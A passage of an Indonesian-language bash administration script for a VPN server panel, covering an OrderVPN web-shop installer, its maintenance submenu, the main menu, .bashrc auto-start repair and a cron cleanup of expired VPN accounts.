                        echo -e "  ${CYAN}→ Test koneksi DB:${NC}"
                        if mysql -u"$DB_USER" -p"$DB_PASS" "$DB_NAME" -e "SELECT COUNT(*) as total_users FROM users;" 2>/dev/null; then
                            echo -e "  ${GREEN}✔ Koneksi DB OK${NC}"
                        else
                            echo -e "  ${RED}✘ Koneksi DB GAGAL — cek DB_PASS di /root/.ordervpn_db${NC}"
                        fi
                    else
                        echo -e "  ${YELLOW}File kredensial DB tidak ditemukan. Install ulang dulu.${NC}"
                    fi
                    printf "  ${DIM}Contoh: vpn-api create vmess user30 30 100 2${NC}\n"
                else
                    echo -e "  ${RED}vpn-api belum dipasang. Install dulu (opsi 1)${NC}"
                fi
                echo ""; read -p "  Tekan ENTER..." ;;
            3)
                clear; print_menu_header "RESTART PHP-FPM + NGINX"
                local php_svc
                php_svc=$(systemctl list-units --type=service --state=active 2>/dev/null | grep -oP 'php\S+fpm' | head -1)
                [[ -z "$php_svc" ]] && php_svc=$(systemctl list-unit-files --type=service 2>/dev/null | grep -oP 'php\S+fpm' | head -1)
                [[ -z "$php_svc" ]] && php_svc="php-fpm"
                echo ""
                # Restart PHP-FPM
                if systemctl restart "$php_svc" 2>/dev/null; then
                    printf "  ${GREEN}✔${NC} PHP-FPM (${php_svc}) direstart\n"
                else
                    printf "  ${RED}✘${NC} Gagal restart PHP-FPM (${php_svc})\n"
                fi
                # Test dan reload nginx (jangan restart mentah-mentah, bisa drop koneksi VPN)
                if nginx -t 2>/dev/null; then
                    printf "  ${GREEN}✔${NC} Nginx config OK\n"
                    if systemctl reload nginx 2>/dev/null; then
                        printf "  ${GREEN}✔${NC} Nginx direload\n"
                    else
                        printf "  ${RED}✘${NC} Gagal reload Nginx\n"
                    fi
                else
                    printf "  ${RED}✘${NC} Nginx config ERROR — jalankan: nginx -t\n"
                fi
                echo ""; read -p "  Tekan ENTER..." ;;
            4)
                clear; print_menu_header "LOG INSTALASI ORDERVPN"
                if [[ -f "$LOG" ]]; then
                    tail -60 "$LOG"
                    echo ""
                    printf "  ${DIM}Log lengkap: %s${NC}\n" "$LOG"
                else
                    echo -e "  ${DIM}Log belum ada — install dulu (opsi 1)${NC}"
                fi
                echo ""; read -p "  Tekan ENTER..." ;;
            5)
                echo ""
                read -p "  Masukkan subdomain (contoh: order.domain.com): " subdomain
                if [[ -z "$subdomain" ]]; then
                    echo -e "  ${YELLOW}Subdomain kosong, dibatalkan.${NC}"
                    sleep 1
                elif [[ ! "$subdomain" =~ ^[a-zA-Z0-9._-]+$ ]]; then
                    echo -e "  ${RED}Format subdomain tidak valid.${NC}"
                    sleep 2
                else
                    printf "  ${CYAN}▸${NC} Setup nginx untuk %s...\n" "$subdomain"
                    if _ordervpn_setup_nginx 8888 "$subdomain"; then
                        echo -e "  ${GREEN}✔ Subdomain $subdomain berhasil disetup${NC}"
                        printf "  ${DIM}Pastikan DNS subdomain sudah mengarah ke IP: %s${NC}\n" "$IP_NOW"
                    else
                        echo -e "  ${RED}✘ Gagal setup subdomain $subdomain${NC}"
                    fi
                fi
                echo ""; read -p "  Tekan ENTER..." ;;
            6)
                echo ""
                read -p "  Yakin uninstall OrderVPN? Semua data akan dihapus! [y/N]: " yn
                if [[ "${yn,,}" == "y" ]]; then
                    printf "  ${CYAN}▸${NC} Menghapus file web...\n"
                    rm -rf /var/www/html/ordervpn
                    printf "  ${CYAN}▸${NC} Menghapus config nginx...\n"
                    rm -f /etc/nginx/sites-{available,enabled}/ordervpn{,-domain}
                    printf "  ${CYAN}▸${NC} Menghapus vpn-api bridge...\n"
                    rm -f /usr/local/bin/vpn-api /etc/sudoers.d/ordervpn-api
                    printf "  ${CYAN}▸${NC} Hapus database...\n"
                    mysql -u root -e "DROP DATABASE IF EXISTS ordervpn_db; DROP USER IF EXISTS 'ordervpn'@'localhost';" 2>/dev/null \
                        && printf "  ${GREEN}✔${NC} Database dihapus\n" \
                        || printf "  ${YELLOW}⚠${NC} DB sudah tidak ada atau gagal hapus\n"
                    # Hapus cron
                    crontab -l 2>/dev/null | grep -v "ordervpn" | crontab - 2>/dev/null
                    if nginx -t 2>/dev/null; then
                        systemctl reload nginx 2>/dev/null
                    fi
                    echo -e "\n  ${GREEN}✔ OrderVPN berhasil diuninstall${NC}"
                else
                    echo -e "  ${DIM}Dibatalkan.${NC}"
                fi
                sleep 2 ;;
            7)
                clear; print_menu_header "REBUILD VPN-API BRIDGE"
                printf "  ${CYAN}▸${NC} Deploy ulang vpn-api bridge...\n"
                if _ordervpn_deploy_bridge; then
                    printf "  ${GREEN}✔ vpn-api bridge berhasil di-rebuild${NC}\n"
                    printf "  ${DIM}Path: /usr/local/bin/vpn-api${NC}\n"
                    # Verifikasi langsung
                    if [[ -x /usr/local/bin/vpn-api ]]; then
                        printf "  ${GREEN}✔ File executable OK${NC}\n"
                    else
                        printf "  ${RED}✘ File tidak executable — cek permission${NC}\n"
                    fi
                else
                    printf "  ${RED}✘ Gagal deploy vpn-api bridge${NC}\n"
                fi
                echo ""; read -p "  Tekan ENTER..." ;;
            8)
                clear; print_menu_header "KREDENSIAL DATABASE ORDERVPN"
                if [[ -f /root/.ordervpn_db ]]; then
                    echo ""
                    cat /root/.ordervpn_db
                    echo ""
                    echo -e "  ${DIM}File: /root/.ordervpn_db (chmod 600)${NC}"
                else
                    echo -e "  ${RED}File kredensial tidak ditemukan.${NC}"
                    echo -e "  ${DIM}Coba install ulang (opsi 1) untuk membuat ulang file ini.${NC}"
                fi
                echo ""; read -p "  Tekan ENTER..." ;;
            0) return ;;
        esac
    done
}

_ordervpn_install() {
    local LOG="/var/log/ordervpn-install.log"
    echo "" > "$LOG"
    clear; print_menu_header "INSTALL ORDERVPN v2.0"
    echo ""
    printf "  ${YELLOW}Proses install akan:${NC}\n"
    printf "  ${DIM}1. Install PHP, MySQL (jika belum)${NC}\n"
    printf "  ${DIM}2. Deploy web OrderVPN ke /var/www/html/ordervpn${NC}\n"
    printf "  ${DIM}3. Pasang vpn-api bridge (sync tunnel.sh)${NC}\n"
    printf "  ${DIM}4. Setup Nginx port 8888${NC}\n"
    printf "  ${DIM}5. Setup database otomatis${NC}\n"
    echo ""
    read -p "  Lanjut? [y/N]: " confirm
    [[ "${confirm,,}" != "y" ]] && return
    echo ""; read -p "  Subdomain custom? (kosongkan=skip): " SUBDOMAIN

    # Install deps
    printf "  ${CYAN}▸${NC} Install dependensi...\n"
    apt-get update -qq >> "$LOG" 2>&1
    local pkgs=()
    command -v mysql    >/dev/null 2>&1 || pkgs+=(mysql-server)
    command -v php      >/dev/null 2>&1 || pkgs+=(php php-fpm php-mysql php-curl php-mbstring php-gd)
    command -v sshpass  >/dev/null 2>&1 || pkgs+=(sshpass)
    command -v jq       >/dev/null 2>&1 || pkgs+=(jq)
    [[ ${#pkgs[@]} -gt 0 ]] && DEBIAN_FRONTEND=noninteractive apt-get install -y "${pkgs[@]}" >> "$LOG" 2>&1
    printf "  ${GREEN}✔${NC} Dependensi OK\n"

    # Database
    printf "  ${CYAN}▸${NC} Setup database...\n"
    DB_PASS=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
    systemctl start mysql 2>/dev/null || systemctl start mariadb 2>/dev/null
    mysql -u root 2>/dev/null << SQLEOF >> "$LOG" 2>&1
CREATE DATABASE IF NOT EXISTS ordervpn_db CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
DROP USER IF EXISTS 'ordervpn'@'localhost';
CREATE USER 'ordervpn'@'localhost' IDENTIFIED BY '${DB_PASS}';
GRANT ALL PRIVILEGES ON ordervpn_db.* TO 'ordervpn'@'localhost';
FLUSH PRIVILEGES;
SQLEOF
    printf "  ${GREEN}✔${NC} Database OK\n"

    # Deploy files
    printf "  ${CYAN}▸${NC} Deploy file web...\n"
    [[ -d /var/www/html/ordervpn ]] && rm -rf /var/www/html/ordervpn.bak 2>/dev/null && mv /var/www/html/ordervpn /var/www/html/ordervpn.bak 2>/dev/null
    _ordervpn_deploy_files "$DB_PASS"

    # Import schema
    mysql -u ordervpn -p"$DB_PASS" ordervpn_db < /var/www/html/ordervpn/database.sql >> "$LOG" 2>&1
    # Server lokal
    local IP_VPS; IP_VPS=$(get_ip 2>/dev/null || hostname -I | awk "{print \$1}")
    mysql -u ordervpn -p"$DB_PASS" ordervpn_db 2>/dev/null << SQLEOF2 >> "$LOG" 2>&1
DELETE FROM servers;
INSERT INTO servers (nama_server,code_server,lokasi,flag,harga_hari,harga_bulan,host,port,ssh_user,status)
VALUES ('VPS Lokal (Youzin Crabz)','local1','Indonesia (Lokal)','🇮🇩',300,9000,'${IP_VPS}',22,'root','ready');
SQLEOF2
    printf "  ${GREEN}✔${NC} File web & database OK\n"

    # Bridge
    printf "  ${CYAN}▸${NC} Deploy vpn-api bridge...\n"
    _ordervpn_deploy_bridge
    printf "  ${GREEN}✔${NC} vpn-api OK\n"

    # Nginx
    printf "  ${CYAN}▸${NC} Setup Nginx port 8888...\n"
    _ordervpn_setup_nginx 8888 "$SUBDOMAIN"
    printf "  ${GREEN}✔${NC} Nginx OK\n"

    # UFW - buka port 8888
    if command -v ufw >/dev/null 2>&1 && ufw status 2>/dev/null | grep -q "active"; then
        ufw allow 8888/tcp >/dev/null 2>&1
        printf "  ${GREEN}✔${NC} UFW port 8888 dibuka\n"
    fi

    # Cron
    local cl="0 * * * * php /var/www/html/ordervpn/cron/expire_accounts.php >> /var/log/ordervpn_cron.log 2>&1"
    crontab -l 2>/dev/null | grep -q "ordervpn" || (crontab -l 2>/dev/null; echo "$cl") | crontab -

    # Permissions
    chown -R www-data:www-data /var/www/html/ordervpn
    chmod -R 755 /var/www/html/ordervpn
    chmod -R 775 /var/www/html/ordervpn/uploads

    # Save credentials
    cat > /root/.ordervpn_db << CREDEOF
DB_HOST=localhost
DB_USER=ordervpn
DB_PASS=${DB_PASS}
DB_NAME=ordervpn_db
CREDEOF
    chmod 600 /root/.ordervpn_db

    echo ""
    printf "  ${GREEN}╔══════════════════════════════════════════════╗${NC}\n"
    printf "  ${GREEN}║  ✔  ORDERVPN v2.0 BERHASIL DIINSTALL!       ║${NC}\n"
    printf "  ${GREEN}╚══════════════════════════════════════════════╝${NC}\n"
    echo ""
    printf "  ${WHITE}URL Panel   :${NC} ${CYAN}http://%s:8888${NC}\n" "$IP_VPS"
    [[ -n "$SUBDOMAIN" ]] && printf "  ${WHITE}Subdomain   :${NC} ${CYAN}http://%s${NC}\n" "$SUBDOMAIN"
    printf "  ${WHITE}Admin Login :${NC} admin / admin123\n"
    printf "  ${YELLOW}  ⚠ Ganti password admin setelah login!${NC}\n"
    echo ""
    printf "  ${DIM}Setup lanjutan di Admin Panel → Pengaturan:${NC}\n"
    printf "  ${DIM}  · Isi kontak WA/Telegram/Instagram${NC}\n"
    printf "  ${DIM}  · Upload QRIS, isi Dana/GoPay/ShopeePay${NC}\n"
    printf "  ${DIM}  · Isi SMTP Gmail untuk OTP email${NC}\n"
    printf "  ${DIM}  · Tambah VPS lain di menu Server${NC}\n"
    echo ""
    read -p "  Tekan ENTER..."
}


main_menu() {
    while true; do
        show_system_info
        show_menu
        printf "${YELLOW}${BOLD}➤ ENTER OPTION [0-21] : ${NC}"
        read -r choice

        case $choice in
            1|01) menu_ssh ;;
            2|02) menu_vmess ;;
            3|03) menu_vless ;;
            4|04) menu_trojan ;;
            5|05) _menu_list_all ;;
            6|06) menu_renew ;;
            7|07) cek_expired ;;
            8|08) delete_expired ;;
            9|09) menu_telegram_bot ;;
            10) change_domain ;;
            11) fix_certificate ;;
            12) clear; optimize_vpn; echo -e "  ${GREEN}\u2714 Optimization done!${NC}"; sleep 2 ;;
            13)
                clear; print_menu_header "RESTART ALL SERVICES"
                local ssh_svc_r; ssh_svc_r=$(get_ssh_service_name)
                nginx -t 2>/dev/null && printf "  ${GREEN}\u2714${NC} Nginx config OK\n" || printf "  ${RED}\u2718${NC} Nginx config ERROR\n"
                xray -test -config "$XRAY_CONFIG" 2>/dev/null && printf "  ${GREEN}\u2714${NC} Xray config OK\n" || printf "  ${RED}\u2718${NC} Xray config ERROR\n"
                echo ""
                for svc in xray nginx "$ssh_svc_r" dropbear haproxy udp-custom vpn-keepalive vpn-bot; do
                    systemctl restart "$svc" 2>/dev/null && \
                        printf "  ${GREEN}\u2714${NC} %-20s ${GREEN}Restarted${NC}\n" "$svc" || \
                        printf "  ${RED}\u2718${NC} %-20s ${RED}Failed${NC}\n" "$svc"
                done
                echo ""; sleep 2 ;;
            14) run_speedtest ;;
            15) _menu_backup ;;
            16) _menu_restore ;;
            17) menu_uninstall ;;
            18|99) menu_advanced ;;
            19) show_info_port ;;
            20) manage_zivpn_udp ;;
            21) menu_ordervpn ;;
            ping|PING) ping_check ;;
            0|00) clear; echo -e "  ${CYAN}Goodbye! — Youzin Crabz Tunel${NC}"; echo -e "  ${DIM}Ketik 'menu' untuk buka panel lagi.${NC}"; echo ""; return 0 ;;
            help|HELP) _show_help ;;
            *) ;;
        esac
    done
}

#================================================
# ENTRY POINT
#================================================

[[ $EUID -ne 0 ]] && {
    echo -e "${RED}Run as root!${NC}"
    echo "  sudo bash $0"
    exit 1
}

# Deteksi environment di awal
detect_ubuntu_version
detect_container
detect_firewall_backend

[[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)

# ── AUTO-HEAL: jalankan sekali saat start ──
# 1. Fix .bashrc jika ada syntax error
if [[ -f /root/.bashrc ]] && ! bash -n /root/.bashrc 2>/dev/null; then
    # Ada syntax error — bersihkan otomatis
    awk '
        /# VPN Panel Auto-Start/ { skip=1; next }
        skip && /^fi[[:space:]]*$/ { skip=0; next }
        skip { next }
        { print }
    ' /root/.bashrc > /tmp/_brc_heal.tmp 2>/dev/null
    grep -v -E 'tunnel\.sh|VPN_MENU_RUNNING|mesg n 2>/dev/null|# VPN Panel'         /tmp/_brc_heal.tmp > /tmp/_brc_heal2.tmp 2>/dev/null
    mv /tmp/_brc_heal2.tmp /root/.bashrc 2>/dev/null
    # Tulis ulang entry bersih
    if ! grep -q "VPN Panel Auto-Start" /root/.bashrc 2>/dev/null; then
        printf '\n# VPN Panel Auto-Start\n' >> /root/.bashrc
        printf 'if [ -n "$PS1" ] && [ "$EUID" -eq 0 ] && [ -z "$VPN_MENU_RUNNING" ]; then\n' >> /root/.bashrc
        printf '    export VPN_MENU_RUNNING=1\n' >> /root/.bashrc
        printf '    mesg n 2>/dev/null\n' >> /root/.bashrc
        printf '    [ -f /root/tunnel.sh ] && . /root/tunnel.sh\n' >> /root/.bashrc
        printf 'fi\n' >> /root/.bashrc
    fi
fi


# 2. Jika timezone masih UTC dan sudah pernah install (ada domain file),
#    biarkan saja — user sudah pilih saat install. Hanya set NTP jika belum aktif.
timedatectl set-ntp true 2>/dev/null || true
command -v chronyc >/dev/null 2>&1 && systemctl is-active --quiet chrony 2>/dev/null ||     systemctl restart chrony 2>/dev/null || true

# 3. Pasang cron delete_expired jika belum ada
if ! crontab -l 2>/dev/null | grep -q "delete_expired_cron"; then
    (crontab -l 2>/dev/null; echo "0 * * * * bash /root/tunnel.sh delete_expired_cron 2>/dev/null") | crontab - 2>/dev/null
fi

# 4. Deploy web jika index.html belum ada
if [[ -f "$DOMAIN_FILE" && ! -f /var/www/html/index.html ]]; then
    rm -f /var/www/html/index.nginx-debian.html /var/www/html/index.htm 2>/dev/null
    deploy_web_page >/dev/null 2>&1
fi

# CLI argument dispatcher
case "${1:-}" in
    deploy_web|web)
        deploy_web_page
        exit 0 ;;
    delete_expired_cron)
        # Jalankan tanpa UI (dipanggil dari cron)
        AKUN_DIR_TMP="${AKUN_DIR:-/root/akun}"
        XRAY_CONFIG_TMP="${XRAY_CONFIG:-/usr/local/etc/xray/config.json}"
        PUBLIC_HTML_TMP="${PUBLIC_HTML:-/var/www/html}"
        today_ts=$(date +%s)
        count_del=0
        shopt -s nullglob
        for f in "${AKUN_DIR_TMP}"/*.txt; do
            [[ ! -f "$f" ]] && continue
            exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | head -1 | cut -d= -f2-)
            [[ -z "$exp_str" ]] && continue
            exp_str_clean="${exp_str//,/}"
            exp_ts=$(date -d "$exp_str_clean" +%s 2>/dev/null)
            [[ -z "$exp_ts" ]] && continue
            if [[ $exp_ts -lt $today_ts ]]; then
                fname=$(basename "$f" .txt)
                uname="${fname#*-}"
                protocol="${fname%%-*}"
                tmp=$(mktemp)
                jq --arg email "$uname"                    'del(.inbounds[].settings.clients[]? | select(.email == $email))'                    "$XRAY_CONFIG_TMP" > "$tmp" 2>/dev/null &&                    mv "$tmp" "$XRAY_CONFIG_TMP" || rm -f "$tmp"
                [[ "$protocol" == "ssh" ]] && userdel -f "$uname" 2>/dev/null
                rm -f "$f"
                rm -f "${PUBLIC_HTML_TMP}/${fname}.txt"
                rm -f "${PUBLIC_HTML_TMP}/${fname}-clash.yaml"
                ((count_del++))
            fi
        done
        shopt -u nullglob
        if [[ $count_del -gt 0 ]]; then
            chmod 644 "$XRAY_CONFIG_TMP" 2>/dev/null
            xray -test -config "$XRAY_CONFIG_TMP" >/dev/null 2>&1 &&                 systemctl restart xray 2>/dev/null
        fi
        exit 0 ;;
    _gen_status)
        # Generate status.json dari cron (tanpa UI)
        local _ph="${PUBLIC_HTML:-/var/www/html}"
        local _xs _ns _hs _ds _ss _us
        _xs=$(systemctl is-active xray 2>/dev/null)
        _ns=$(systemctl is-active nginx 2>/dev/null)
        _hs=$(systemctl is-active haproxy 2>/dev/null)
        _ds=$(systemctl is-active dropbear 2>/dev/null)
        _ss=$(systemctl is-active ssh 2>/dev/null || systemctl is-active sshd 2>/dev/null)
        _us=$(systemctl is-active udp-custom 2>/dev/null)
        printf '{"xray":"%s","nginx":"%s","haproxy":"%s","dropbear":"%s","sshd":"%s","udp-custom":"%s"}\n' \
            "$_xs" "$_ns" "$_hs" "$_ds" "$_ss" "$_us" > "$_ph/status.json" 2>/dev/null
        chmod 644 "$_ph/status.json" 2>/dev/null || true
        exit 0 ;;
    install)
        auto_install
        exit 0 ;;
esac

if [[ ! -f "$DOMAIN_FILE" ]]; then
    auto_install
fi

setup_menu_command

# Jalankan main_menu — setelah exit [0], user tetap di shell (tidak disconnect)
# Cek apakah script di-source atau dijalankan langsung
if [[ "${BASH_SOURCE[0]}" != "${0}" ]]; then
    # Di-source → main_menu return langsung ke shell pemanggil
    main_menu
else
    # Dijalankan langsung (bash tunnel.sh) →
    # Spawn shell baru setelah menu exit agar SSH tidak disconnect
    main_menu
    # Setelah exit menu, buka interactive shell supaya SSH tetap hidup
    if [[ -n "$SSH_CONNECTION" || -n "$SSH_TTY" ]]; then
        exec bash --login
    fi
fi
